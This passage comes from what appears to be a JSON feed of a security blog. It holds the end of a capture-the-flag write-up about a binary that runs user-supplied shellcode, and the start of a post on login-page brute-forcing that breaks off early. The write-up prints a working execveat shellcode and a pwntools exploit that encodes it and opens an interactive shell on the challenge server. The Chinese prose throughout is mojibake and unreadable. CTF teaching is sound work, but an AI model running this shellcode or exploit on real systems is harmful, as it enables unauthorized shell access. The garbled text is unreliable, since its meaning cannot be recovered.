punctuation\">(</span>count <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>count <span class=\"token operator\">&lt;</span> buf_size<span class=\"token punctuation\">;</span> count <span class=\"token operator\">=</span> count <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>count <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                cVar1 <span class=\"token operator\">=</span> <span class=\"token string\">'\\x01'</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br>            <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>                cVar1 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br>            __buf<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>count<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token punctuation\">)</span>__buf<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>count<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token punctuation\">)</span>count <span class=\"token operator\">*</span> cVar1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        <span class=\"token comment\">// set execute permissions</span><br>        mem_perm_result <span class=\"token operator\">=</span> <span class=\"token function\">mprotect</span><span class=\"token punctuation\">(</span>__buf<span class=\"token punctuation\">,</span>PAGE_SIZE<span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>mem_perm_result <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>__buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Failed to set memory permissions.\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        <span class=\"token comment\">// run shellcode</span><br>        <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>__buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>__buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>é€™æ¬¡æ²’æœ‰ä»»ä½•éœ€è¦ overflow çš„åœ°æ–¹ï¼Œä¹Ÿè·Ÿ memory protection æ²’ä»€éº¼é—œä¿‚ï¼Œå› ç‚ºç¨‹å¼æœƒè·Ÿæˆ‘å€‘è¦è¼¸å…¥ç„¶å¾Œç›´æ¥åŸ·è¡Œï¼Œæ‰€ä»¥æˆ‘å€‘åªè¦ç¢ºä¿è¼¸å…¥çš„ shellcode æ²’å•é¡Œå°±å¯ä»¥äº†ã€‚</p>\n<h3 id=\"how-to-generate-shellcode%3F\"><a class=\"direct-link\" href=\"#how-to-generate-shellcode%3F\">#</a> how to generate shellcode?</h3>\n<p>è¦ç”¢ç”Ÿ shellcode æœ‰ä¸‰ç¨®æ–¹å¼ï¼šè‡ªå·±å¯«ã€ç”¨å·¥å…·ç”¢ã€ä¸Šç¶²æ‰¾ã€‚</p>\n<p>æœ€æ‰å¯¦çš„æ–¹å¼æ˜¯è‡ªå·±å¯«ï¼Œä½ å¯ä»¥å…ˆç”¨ c æŠŠç¨‹å¼å¯«å‡ºä¾†ï¼Œç„¶å¾ŒæŠŠç·¨è­¯å®Œçš„çµæœ copy pasteï¼Œæˆ–æ˜¯ç›´æ¥ç”¨çµ„èªå¯«ï¼Œç„¶å¾Œç”¨ <code>nasm</code> è½‰æ›ã€‚æ•™å­¸æ–‡ç¶²è·¯ä¸Šå¾ˆå¤šï¼Œé€™è£¡é™„ä¸Šæˆ‘è‡ªå·±è¦ºå¾—æ»¿å¥½æ‡‚çš„æ–‡ç« ï¼š<a href=\"https://www.vividmachines.com/shellcode/shellcode.html\">Shellcoding for Linux and Windows Tutorial</a></p>\n<p>ç”¨å·¥å…·ç”¢ä¹Ÿæ˜¯å¾ˆå¸¸ç”¨çš„æ–¹æ³•ï¼Œæœ€æ–¹ä¾¿çš„æ˜¯ç”¨ metasploit çš„ msfvenomï¼Œå¥½è™•æ˜¯ä½ å¯ä»¥æ§åˆ¶ä¸€äº›åƒæ•¸ï¼ˆä¾‹å¦‚ reverse shell è¦ç”¨çš„ IP è·Ÿ portï¼‰è·Ÿå½ˆæ€§ï¼ˆä¾‹å¦‚åŠ ä¸Šä¸€äº› encoding ä¾†è¦é¿é˜²æ¯’æˆ–æ˜¯èº²é WAFï¼‰ï¼Œä½†åˆå¯ä»¥ä¿æœ‰è‡ªå‹•åŒ–çš„ç‰¹æ€§ã€‚</p>\n<p>ç•¶ç„¶ï¼Œä¸Šç¶²æ‰¾ä¹Ÿæ˜¯ä¸€å€‹æ–¹æ³•ã€‚æœ€å¸¸ç”¨çš„ç·šä¸Šè³‡æºå¤§æ¦‚å°±æ˜¯ <a href=\"http://shell-storm.org/shellcode/\">shellstorm</a> è·Ÿ <a href=\"https://www.exploit-db.com/shellcodes\">ExploitDB</a> é€™å…©å€‹åœ°æ–¹ï¼Œæ”¶è—äº†å„ç¨® architectureã€åŠŸèƒ½ã€é•·åº¦çš„ shellcodeã€‚å¦‚æœä¸ç”¨ä»»ä½•å®¢è£½åŒ–ï¼Œä¾‹å¦‚åªæ˜¯è¦åšåˆ° local é–‹ shell æˆ–æ˜¯è®€å– flag.txt ç­‰å›ºå®šåŠŸèƒ½ï¼Œåœ¨ä¸Šé¢æ‡‰è©²å¯ä»¥è¼•é¬†æ‰¾åˆ°å¯ä»¥ç›´æ¥ç”¨çš„ shellcodeã€‚</p>\n<p>é€™é¡Œæˆ‘å¾ shellstorm é¸äº†ä¸€å€‹éå¸¸çŸ­çš„ payloadï¼š<a href=\"http://shell-storm.org/shellcode/files/shellcode-905.php\">x86_64 execveat(&quot;/bin//sh&quot;) 29 bytes shellcode</a>ï¼Œç•¶ç„¶é€™ä¸æ˜¯å”¯ä¸€æœƒæˆåŠŸçš„ï¼Œä½ å¯ä»¥é¸åˆ¥çš„è‡ªå·±è©¦è©¦çœ‹ï¼Œç„¶å¾Œå˜—è©¦ local debug åˆ¤æ–·ç‚ºä»€éº¼æœ‰äº›æœƒæˆåŠŸæœ‰äº›æœƒå¤±æ•—ã€‚</p>\n<h3 id=\"bypass-obfuscation\"><a class=\"direct-link\" href=\"#bypass-obfuscation\">#</a> bypass obfuscation</h3>\n<p>æœ‰äº† shellcode ä¹‹å¾Œï¼Œå°±å¯ä»¥ä¾†çœ‹çœ‹ä¸­é–“ processing çš„éƒ¨åˆ†äº†ã€‚</p>\n<p><code>if ((count &amp; 1) == 0)</code> å°±æ˜¯åˆ¤æ–· count çš„å¥‡å¶ï¼Œæœ€å¾Œä¸€å€‹ bit æ˜¯ 1 çš„è©±ï¼ˆå¥‡æ•¸ï¼‰<code>cVar1 = -1</code>ï¼Œæœ€å¾Œä¸€å€‹ bit æ˜¯ 0 çš„è©±ï¼ˆå¶æ•¸ï¼‰<code>cVar1 = 1</code>ã€‚é€™å€‹ count çš„å¥‡å¶æ€§è³ªæœƒè¢«ç”¨ä¾† in place ä¿®æ”¹è¼¸å…¥çš„è³‡è¨Šï¼š<code>__buf[count] = (__buf[count] + count * cVar1);</code>ï¼Œä¹Ÿå°±æ˜¯èªªæŠŠæ¯ä¸€å€‹å­—å…ƒç”¨ 16 é€²ä½è¡¨ç¤ºæ³•ä½œé‹ç®—ï¼Œç¬¬ 0 å€‹ +0ï¼Œç¬¬ 1 å€‹ -1ï¼Œç¬¬ 2 å€‹ +2ï¼Œç¬¬ 3 å€‹ -3â‹¯â‹¯ æ›´å‹•æ¯ä¸€å€‹è¼¸å…¥ã€‚</p>\n<p>ä½ å¯ä»¥æŠŠåŸæœ¬çš„ shellcode è¼¸å…¥é€²å»ï¼Œç„¶å¾Œåœ¨ processing çµæŸçš„åœ°æ–¹è¨­ä¸€å€‹ä¸­æ–·é»ï¼Œçœ‹ä¸€ä¸‹å…©è€…ä¹‹é–“çš„å·®åˆ¥ï¼Œå°±å¯ä»¥æ¸…æ¥šçœ‹å‡ºé‚è¼¯äº†ã€‚å¾ 6a é–‹å§‹ï¼Œä¸‹ä¸€å€‹å¾ 0x42 è®Šæˆ 0x41ï¼Œ0x58 è®Šæˆ 0x5aï¼Œç›´åˆ°æœ€å¾Œ 0x05 è¢« +28 è®Šæˆ 0x21ï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\"># original shellcode<br>#0x559a4fc78000:\t0x529948c4fe58426a\t0x2f2f6e69622fbf48<br>#0x559a4fc78010:\t0xd089495e54576873\t0x00000a 050fd28949<br><br># modified shellcode<br>#                      - + - + - + - +     - + - + - + - +<br>#0x559a4fc78000:\t0x4b9f43c8fb5a416a\t0x203d61755739b650<br>#0x559a4fc78010:\t0xb99f347241695783\t0x0000ed 21f4ec7061</code></pre>\n<p>æ‰€ä»¥æˆ‘å€‘åªè¦åœ¨é€å‡º shellcode å‰åå‘æ“ä½œï¼ŒæŠŠåŠ æ¸›è™•ç†å¥½ï¼Œé€éå»ä¹‹å¾Œç¨‹å¼å°±æœƒæŠŠå®ƒé‚„åŸæˆæˆ‘å€‘çš„ shellcode äº†ã€‚ç”¨ pwntools å¯«çš„ exploit å¦‚ä¸‹ï¼ˆè¦ç‰¹åˆ¥æ³¨æ„çš„æ˜¯ overflow å’Œ underflow çš„è™•ç†ï¼‰ï¼š</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span><br><br><span class=\"token comment\">#p = process('./shellcoded')</span><br>p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'challenge.ctf.games'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32383</span><span class=\"token punctuation\">)</span><br><br>sc <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x6a\\x42\\x58\\xfe\\xc4\\x48\\x99\\x52\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5e\\x49\\x89\\xd0\\x49\\x89\\xd2\\x0f\\x05'</span><br><br>new_sc <span class=\"token operator\">=</span> <span class=\"token string\">''</span><br><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><br>    <span class=\"token keyword\">if</span> i<span class=\"token operator\">%</span><span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span><br>        m <span class=\"token operator\">=</span> <span class=\"token number\">1</span><br>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><br>        m <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><br>    v <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>sc<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> m<span class=\"token operator\">*</span>i<br>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">if</span> v<span class=\"token operator\">&lt;</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><br>        new_sc <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>v<span class=\"token operator\">+</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">elif</span> v<span class=\"token operator\">></span><span class=\"token number\">255</span><span class=\"token punctuation\">:</span><br>        new_sc <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>v<span class=\"token operator\">-</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><br>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span><br>\t    new_sc <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span><br><br>p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>new_sc<span class=\"token punctuation\">)</span><br>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> çµèª</h2>\n<p>åš binary exploitation çš„å–œæ­¡ segmentation fault å°±è·Ÿåš web çš„å–œæ­¡ 500 internal server error å·®ä¸å¤šï¼Œåªè¦å¯ä»¥è®“ç¨‹å¼å‡ºç¾éé æœŸçš„éŒ¯èª¤å°±æœ‰å¸Œæœ› XDDD</p>\n<p>é›–ç„¶åˆ°ç›®å‰ç‚ºæ­¢ä»‹ç´¹çš„éƒ½é‚„æ˜¯ pwn ä¸­æœ€ç²—æ·ºçš„çš®æ¯›ï¼Œä½†å¸Œæœ›å¤šå°‘æœ‰å‹¾èµ·å¤§å®¶çš„èˆˆè¶£ï¼Œè®“å¤§å®¶å¾è¨˜æ†¶é«”çš„è§’åº¦å‡ºç™¼æƒ³æƒ³è‡ªå·±å¯«çš„ç¨‹å¼ç¢¼å¦‚ä½•é‹ä½œï¼Œç™¼å‡ºã€å“¦åŸä¾†æ˜¯é€™æ¨£çš„å‘€ã€çš„æ„Ÿå˜†ã€‚</p>\n<p>ä¸‹ä¸€ç¯‡æˆ‘å€‘å†ä¾†æ¢è¨ pwn ä¸­æœ€å¸¸è½åˆ°çš„ ROP æ˜¯å¦‚ä½•é‹ä½œçš„ï¼Œgadget æ˜¯ä»€éº¼ï¼Œä»¥åŠå¦‚ä½•æ§‹é€ é€²éšä¸€äº›çš„ exploitã€‚</p>\n",
      "date_published": "2021-09-29T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/authentication/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/authentication/",
      "title": "è¢«ç›œå¸³è™Ÿæ˜¯èª°çš„éŒ¯ï¼ŸèŠèŠ Authentication",
      "content_html": "<!-- summary -->\n<p>ã€èº«ä»½é©—è­‰æ©Ÿåˆ¶é­ç ´è§£ã€è½èµ·ä¾†å¾ˆæŠ€è¡“ï¼Œä½†ã€ç›œå¸³è™Ÿã€å¤§å®¶æ‡‰è©²å°±éƒ½å¾ˆæœ‰æ„Ÿäº†ã€‚æ²’éŒ¯ï¼Œç›œå¸³è™Ÿä¸åªæ˜¯æœ‹å‹ä¹‹é–“æƒ¡æçš„ç©ç¬‘ï¼Œè€Œæ˜¯çœŸå¯¦ä¸–ç•Œé§­å®¢å…¥ä¾µæ‰‹æ³•æœ€å¤§å®—æ²’æœ‰ä¹‹ä¸€ã€‚é‚£éº¼ï¼Œè¢«ç›œå¸³è™Ÿæ˜¯èª°çš„éŒ¯å‘¢ï¼Ÿ</p>\n<!-- summary -->\n<p>å…ˆæƒ³æƒ³ä½ éƒ½æ€éº¼ç›œæœ‹å‹å¸³è™Ÿçš„å§ã€‚</p>\n<p>æœ‰å¯èƒ½æ˜¯è¶ä»–å»ä¸Šå»æ‰€çš„æ™‚å€™å·ç™¼æ–‡ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯ä»–ç”¨å­¸æ ¡é›»è…¦å»å¿˜äº†ç™»å‡ºï¼Œæ›´æœ‰å¯èƒ½çš„æ˜¯ã€å•Šä»–å°±è¬å¹´ä¸€çµ„å¸³è™Ÿå•Šï¼Œä¸å°±æ˜¯åå­—åŠ ç”Ÿæ—¥å˜›ã€ã€‚</p>\n<p>æ²’éŒ¯ï¼Œä½¿ç”¨å¼±å¯†ç¢¼çš„ç¢ºæ˜¯å¸³è™Ÿè¢«ç ´è§£æœ€å¤§çš„åŸå› ä¹‹ä¸€ã€‚å¼±å¯†ç¢¼ä¸åªæ˜¯ qwerty monkey iloveyou é€™ç¨®éš¨ä¾¿ä¸€å€‹å­—å…¸æª”å°±å¯ä»¥åœ¨åŠå°æ™‚å…§çˆ†é–‹çš„å¸¸è¦‹å­—ä¸²ï¼Œé‚„åŒ…å«è·Ÿå€‹è³‡ç›¸é—œï¼Œç”¨åå­—ã€ç”Ÿæ—¥ã€é›»è©±ã€è¦ªæœ‹å¥½å‹çš„è³‡è¨Šçµ„åˆè€Œæˆçš„å­—ä¸²ã€‚å°±ç®—ä½ åœ¨å‰å¾Œå¤šåŠ ä¸€å€‹é©šå˜†è™Ÿæˆ–æ•¸å­—ï¼Œå°é§­å®¢ä¾†èªªä¹Ÿåªæ˜¯å¤šèŠ±ä¸€åˆ†é˜å°±èƒ½ç ´è§£çš„ã€‚è€Œä¸€æ—¦ç ´ç²ä¸€çµ„å¸³å¯†ï¼Œä½ çš„å¤šå€‹å¸³è™Ÿå¤§æ¦‚ä¹Ÿè·Ÿè‘—æ·ªé™·äº†ï¼Œç•¢ç«Ÿï¼Œå¤§å¤šæ•¸äººéƒ½æ˜¯ä¸€å…©çµ„å¯†ç¢¼æ‰“å¤©ä¸‹è€Œä¸”å¾ä¾†ä¸æ›´æ›çš„ï¼Œå°±ç®—æœƒæ›ä¹Ÿé€šå¸¸æœ‰æŸç¨®è¦å¾‹ï¼Œä¾‹å¦‚å¾ iamhappy1 è®Š iamhappy12 å†åˆ° iamhappy123ã€‚</p>\n<p><figure><img src=\"https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2014/11/social-media-account-hacked.jpg\" /><figcaption><p>image from <a href=\"https://www.avira.com/en/blog/hacked-social-media-account\">Avira</a></p>\n</figcaption></figure></p>\n<p>ä½ å¯èƒ½è¦ºå¾—ï¼Œé§­å®¢å“ªæœƒé€™éº¼äº†è§£æˆ‘ï¼Ÿçš„ç¢ºï¼Œé§­å®¢å¯èƒ½ä¸ã€èªè­˜ã€ä½ ï¼Œä½†åˆ¥å¿˜äº†ï¼Œä½ åœ¨ç¤¾ç¾¤è»Ÿé«”ä¸Šçš„è²¼æ–‡ç•™è¨€ã€ä½ çš„æœ‹å‹æ¸…å–®ã€ä½ åœ¨åˆ¥çš„ç¶²ç«™æˆ–å•åˆ¸ä¸Šç„¡æ„ç•™ä¸‹çš„è³‡æ–™ï¼Œå…¨éƒ½æ˜¯é§­å®¢ç§˜å¯†æœé›†çš„æ‹¼åœ–ç¢ç‰‡ï¼æœ‰äº†é€™éº¼å¤šæ•¸ä½è¶³è·¡ï¼Œè¦çŸ¥é“ä½ çš„å‡ºç”Ÿå¹´æœˆæ—¥ã€åœ‹å°åœ‹ä¸­é«˜ä¸­å­¸è™Ÿã€å¸¸å»çš„åº—è·Ÿè¦å¥½çš„æœ‹å‹ï¼Œå¯æ˜¯æ˜“å¦‚åæŒå‘¢ï¼</p>\n<p>ä½†å¦‚æœä¸è®“ä½ ç”¨é€™äº›è·Ÿä½ ç›¸é—œçš„è³‡è¨Šï¼Œè¦æ±‚ä½ æ¯å€‹ç™»å…¥é é¢éƒ½è¦ç”¨å®Œå…¨ä¸åŒçš„ 10 ä½äº‚æ•¸ç•¶å¯†ç¢¼ï¼Œä½ è¨˜å¾—ä½å—ï¼Ÿ</p>\n<p>æ ¹æ“šå¯†ç¢¼ç®¡ç†è»Ÿé«” <a href=\"https://www.techradar.com/reviews/nordpass\">NordPass</a> çµ±è¨ˆï¼Œä¸€å€‹äººå¹³å‡æœ‰ 100 çµ„å¯†ç¢¼ã€‚ä¹Ÿå°±æ˜¯èªªï¼Œåœ¨ä¸ä½¿ç”¨å¯†ç¢¼ç®¡ç†è»Ÿé«”çš„æƒ…æ³ä¸‹ï¼Œä½ å¿…é ˆè…¦è¢‹è£¡ç‰¢ç‰¢è¨˜ä½ 100 å€‹æ¯«ä¸ç›¸å¹²çš„ 10 ä½äº‚æ•¸ã€‚è€Œå°±ç®—ä½ ä½¿ç”¨äº†å¯†ç¢¼ç®¡ç†è»Ÿé«”ä¾†å„²å­˜é€™ 100 å€‹äº‚æ•¸ï¼Œå¦‚æœä½ çš„ master password æœ¬èº«é‚„æ˜¯å¼±å¯†ç¢¼ï¼Œé‚£é§­å®¢åªè¦ç ´è§£å®ƒå°±å¯ä»¥ç²å¾—ä½ å…¨éƒ¨çš„å¯†ç¢¼äº†ã€‚</p>\n<p>å¯è¦‹å°å¤§å¤šæ•¸äººä¾†èªªï¼Œå®Œå…¨ä¸ä½¿ç”¨å¼±å¯†ç¢¼é¡¯ç„¶ä¸æ˜¯å¯è¡Œçš„åšæ³•ã€‚é‚£æˆ‘å€‘é‚„èƒ½å¾å“ªè£¡é˜²æ­¢ã€ç›œå¸³è™Ÿã€å‘¢ï¼Ÿ</p>\n<blockquote>\n<p>å›æƒ³å‰é¢çš„æƒ…å¢ƒï¼Œæœƒç™¼ç”Ÿã€è¢«ç›œå¸³è™Ÿã€é€šå¸¸æ˜¯å› ç‚ºä½¿ç”¨äº†èƒ½è¢«é æ¸¬è·Ÿåˆ—èˆ‰å˜—è©¦çš„å¯†ç¢¼ï¼Œæ—¢ç„¶é›£ä»¥æœçµ•ã€è¢«é æ¸¬ã€çš„å¯èƒ½ï¼Œæˆ‘å€‘è‡³å°‘å¯ä»¥å¾€ã€è¢«åˆ—èˆ‰å˜—è©¦ã€é€™é‚Šé˜²å µã€‚<br>\nå¦‚æœæ”»æ“Šè€…æ²’è¾¦æ³•é€éç™»å…¥é é¢çš„åæ‡‰ä¾†çŸ¥é“æ”»æ“Šæ˜¯å¦æˆåŠŸï¼Œæˆ–æ˜¯åªæœ‰å°‘å°‘çš„å¹¾æ¬¡æ©Ÿæœƒå¯ä»¥å˜—è©¦ï¼Œé‚£åªè¦å¯†ç¢¼ä¸æ˜¯æœ€ç›´è¦ºæœ€å¥½çŒœçš„é‚£å¹¾çµ„å°±èƒ½æš«æ™‚èº²éä¸€åŠ«ã€‚</p>\n</blockquote>\n<p>æ³¨æ„ï¼Œé€™è£¡èªªçš„æš«æ™‚æ˜¯æŒ‡é§­å®¢æ²’è¾¦æ³•éå¸¸å¿«é€Ÿè¼•é¬†çš„ç ´è§£ä½ çš„å¯†ç¢¼ï¼Œä½†å¦‚æœä½ åœ¨å¤šå€‹æœå‹™éƒ½é‡è¤‡ä½¿ç”¨åŒä¸€çµ„å¯†ç¢¼ï¼Œé‚£åªè¦æœ‰å¤ å¤šç¶²ç«™å°±æœƒç´¯ç©å¤ å¤šæ©Ÿæœƒè®“é§­å®¢å¤šèŠ±ä¸€é»æ™‚é–“æ’åˆ°æ­£ç¢ºçš„é‚£ä¸€çµ„ï¼</p>\n<p>ä½œç‚ºé–‹ç™¼è€…ï¼Œè©²å¦‚ä½•é˜²ç¯„ã€å¸³è™Ÿå¯†ç¢¼è¢«åˆ—èˆ‰å˜—è©¦ã€å‘¢ï¼Ÿè®“æˆ‘å€‘çœ‹çœ‹ä¸€å€‹ç¶“å…¸ç¯„ä¾‹ã€‚</p>\n<h2 id=\"%E9%96%8B%E7%99%BC%E8%80%85%E8%88%87%E9%A7%AD%E5%AE%A2%E7%9A%84%E8%A7%92%E5%8A%9B\"><a class=\"direct-link\" href=\"#%E9%96%8B%E7%99%BC%E8%80%85%E8%88%87%E9%A7%AD%E5%AE%A2%E7%9A%84%E8%A7%92%E5%8A%9B\">#</a> é–‹ç™¼è€…èˆ‡é§­å®¢çš„è§’åŠ›</h2>\n<p>å°æ˜æ˜¯å€‹æ–°æ‰‹å·¥ç¨‹å¸«ï¼Œå­¸æˆå¾Œèˆˆæ²–æ²–åŠ å…¥ä¸€å€‹åœ˜éšŠé–‹ç™¼é›»å•†å¹³å°ï¼Œè² è²¬ç®¡ç†å®¢æˆ¶ç™»å…¥è·Ÿè¨­å®šçš„æ¨¡çµ„ã€‚ä¸éåŠå¹´ï¼Œé›»å•†å¹³å°å¤§ç²å¥½è©•ï¼Œä½¿ç”¨è€…æ¯å€‹æœˆéƒ½ä»¥å€æ•¸æˆé•·ï¼Œå°æ˜è¦ºå¾—éŒ¢é€”å…‰æ˜ï¼Œéå¸¸æœ‰æˆå°±æ„Ÿã€‚çµæœå…©å¤©å¾Œåœ¨æ–°èä¸Šçœ‹åˆ°ï¼š</p>\n<blockquote>\n<p>é©šï¼çŸ¥åé›»å•†å¹³å°æ´©æ¼å¤§é‡å€‹è³‡ï¼<br>\nå‚³å‡ºçŸ¥åé›»å•†å¹³å°é­é§­ï¼Œç«Ÿæœ‰é«˜é” 300000 ç­†å®¢æˆ¶è³‡è¨Šæ–¼æš—ç¶²æ‹‹å”®ï¼Œå…§å®¹åŒ…å«ä¿¡ç”¨å¡ã€æ¶ˆè²»ç´€éŒ„ç­‰è³‡è¨Šï¼Œå—å®³ç¯„åœéä½ˆæ­æ´²äºæ´²ç­‰æ•¸ååœ‹å®¶ï¼Œå…¶ä¸­ä¸ä¹çŸ¥åå» å•†ã€‚æ“šç›¸é—œäººå£«æ–¼ twitter é€éœ²ï¼Œç”±æ–¼å¹³å°ç™»å…¥é é¢å­˜åœ¨å¼±é»ï¼Œé§­å®¢ä»¥æš´åŠ›ç ´è§£ç²å–å¤šçµ„å¸³å¯†è³‡è¨Šï¼ŒåŒ…å«æŸç®¡ç†å“¡æ¬Šé™å¸³è™Ÿï¼Œé€²è€Œå¾—ä»¥ç«Šå–å¤§é‡å€‹è³‡ã€‚</p>\n</blockquote>\n<p>å°æ˜é¦¬ä¸Šæ‰¾ä¾†é•·æœŸæ¥è§¸è³‡å®‰çš„å¥½å‹é˜¿æŸšè«®è©¢ï¼Œé˜¿æŸšä¸€çœ‹å…ˆå•å¯¦ä½œé‚è¼¯ã€‚å°æ˜éå¸¸å›°æƒ‘ï¼Œä¸å°±æ˜¯æŠŠä½¿ç”¨è€…è¼¸å…¥çš„å¸³è™Ÿæ‹¿å»æŸ¥ä¸€ä¸‹è³‡æ–™åº«ï¼Œå¦‚æœæœ‰é€™å€‹ä½¿ç”¨è€…å†å»æŸ¥ä¸€æ¬¡å¯†ç¢¼å—ï¼Ÿå¦‚æœæŸ¥ç„¡æ­¤ä½¿ç”¨è€…ï¼Œç•«é¢ä¸Šå°±æœƒé¡¯ç¤ºã€å¸³è™ŸéŒ¯èª¤ã€ï¼Œå¯†ç¢¼ä¸å°å°±æœƒé¡¯ç¤ºã€å¯†ç¢¼éŒ¯èª¤ã€ï¼Œæ•™å­¸æ–‡ç« ä¸éƒ½æ˜¯é€™æ¨£åšçš„å—ï¼Ÿ</p>\n<p>é˜¿æŸšç›´æ–é ­ï¼Œåˆ—å‡ºä¸‰å¤§ç½ªç‹€ï¼š</p>\n<ul>\n<li>å…ˆæŸ¥å¸³è™Ÿå†æŸ¥å¯†ç¢¼</li>\n<li>éŒ¯èª¤è¨Šæ¯å¤ªæ˜ç¢º</li>\n<li>æ²’æœ‰ä»»ä½•ç™»å…¥æ¬¡æ•¸é™åˆ¶</li>\n</ul>\n<p>çœ‹è‘—å°æ˜ä¸€è‡‰å•è™Ÿï¼Œé˜¿æŸšå¨“å¨“é“ä¾†ï¼š</p>\n<h3 id=\"%E5%85%88%E6%9F%A5%E5%B8%B3%E8%99%9F%E5%86%8D%E6%9F%A5%E5%AF%86%E7%A2%BC\"><a class=\"direct-link\" href=\"#%E5%85%88%E6%9F%A5%E5%B8%B3%E8%99%9F%E5%86%8D%E6%9F%A5%E5%AF%86%E7%A2%BC\">#</a> 